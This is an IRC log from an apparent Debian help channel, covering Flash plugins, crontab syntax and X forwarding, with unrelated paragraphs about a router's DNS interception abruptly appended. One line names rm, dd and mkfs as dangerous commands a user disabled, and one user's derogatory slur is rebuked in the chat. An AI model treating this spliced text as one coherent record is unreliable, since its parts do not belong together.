22:10  stew: LeetDog1337: i doubt it
22:10  razieliyo: I wonder what will happen if I set, for example, /dev/sdb /media/disk1 and /dev/sdc /media/disk2 and I plug the disk2 first and the disk1 last
22:10  razieliyo: would disk2 set into /media/disk1 and disk1 into /media/disk2?
22:10  acemi: Tony2998: there is something wrong in your system. flash 10.x is already installed
22:10  razieliyo: because debian names each sdX by pluggin them on I wish
22:11  stew: antii: there is nothiong wrong.  he has multiple versions installed and the free version is preferred, and he hasn't told it otherwise yet
22:12  stew: acemi: ^
22:12  jhutchins_lt: Tony2998: What about the packages you got directly from Adobe - where did you put those?
22:12  antii: hmmpf. installed squeeze today and trying to run a cronjob but just getting a /bin/sh: antii: not found
22:12  stew: antii: how/where did you insatll the cronjob?
22:13  jhutchins_lt: Tony2998: If you remove that, and delete the stuff you installed manually, then you can confirm that iceweasel doesn't show a flash plugin any more.
22:13  stew: antii: you are probably using a username column somewhere where it isn't used (like a user cronjob)
22:13  jhutchins_lt: Tony2998: That gets rid of 9, and then you should try again to install from backports.
22:13  stew: jhutchins_lt: it should, since he has two different flash plugin packages installed
22:13  jhutchins_lt: stew: At least.
22:14  stew: jhutchins_lt: and what you are saying isn't going to get rid of 9
22:14  jhutchins_lt: Tony2998: Does this make sense to you?
22:14  jhutchins_lt: stew: If he removes the debian package and removes the stuff he manually installed?
22:14  stew: jhutchins_lt: which of the two debian packages?  the flashplugin-mozilla one that he told us about?
22:15  jhutchins_lt: stew: I though he said dpkg only listed one?
22:15  jhutchins_lt: stew: That's what I was going from.
22:15  stew: jhutchins_lt: yes, becuase you asked him to look for packages only with "flash" in the name
22:16  stew: jhutchins_lt: then no, that won't get rid of flash 9, that was 10.  that would leave him with ONLY a free version supporting 9.  the one he is currently using
22:16  jhutchins_lt: I'll leave it to you then, obviously I'm of more use doing laundry.
22:16  stew: whatever
22:16  Tony2998: jhutchins_lt this is a clean system with the default install
22:16  stew: i'm not helping with the non-free nonsense
22:17  Rdogg1: stew: any idea why my images arent displaying in links2 -g?
22:17  stew: Rdogg1: where are you running it?  in x? or in a console?
22:17  Rdogg1: x
22:17  Rdogg1: but in a remote computer
22:17  Rdogg1: (Xming)
22:17  Rdogg1: on windows
22:18  antii: stew: via crontab -e?
22:18  stew: Rdogg1: i don't know how to use windows, sorry
22:18  stew: antii: then leave off the "antii" user crontabs always run as the user, they don't take a user field (man 5 crontab)
22:18  Rdogg1: well the problem is on the linux side..
22:18  antii: ah
22:18  antii: will try.
22:18  stew: Rdogg1: how did you determine that it is on the linux side?
22:18  antii: can run it without root aswell? if the application allow?
22:18  Rdogg1: stew: XMing is just like a ssh -X so it should be..
22:19  Tony2998: Thank you jhutchins and all of those that try helping me, I will run the training from my gay windows labtop since Debian does not play nice with Codecs and flash for now. Thank you. I will resist for now going back to ubuntu, I want to learn Debian, that's my goal.
22:19  stew: Rdogg1: so, do other browsers like iceweasel work?
22:19  Rdogg1: stew: never got iceweasel to work, complains about some C gtk+ problem :/
22:19  stew: Tony2998: don't use 'gay' as a derrogatory adjective in here, please.  it is offensive to  many people
22:19  Rdogg1: stew: (firefox-bin:3015): Gtk-WARNING **: Locale not supported by C library.

22:46  Rdogg1: stew: i disabled the most dangerous commands, like rm, dd, and mkfs

Note that I can ping the IP address for ns1.debian.org and all other Debian servers.  It also seems to be independent of the DNS server I instruct host to use.  host debian.org 4.2.2.1 just says that the connection timed out, no servers could be reached, but host ^debian.org 4.2.2.1 works.  :/

My WRT54G running Tomato was indeed running a DNS forwarder and intercepting DNS requests, even though this configuration has not been touched in forever rebooting it also did not work but I've gotten around it by just disabling those features for now.
